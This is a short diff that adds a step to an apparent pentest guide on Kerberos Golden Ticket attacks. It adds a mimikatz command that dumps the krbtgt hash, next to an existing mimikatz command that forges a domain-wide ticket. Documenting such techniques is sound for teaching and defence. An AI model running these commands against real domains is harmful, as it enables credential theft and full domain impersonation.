@@ -83,6 +83,9 @@ A Golden Ticket allows for domain-wide access impersonation. Key command and par
 Example:
 
 ```bash
+#Dump the krbtgt Hash -
+lsadump::lsa /inject /name:krbtgt
+
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
 
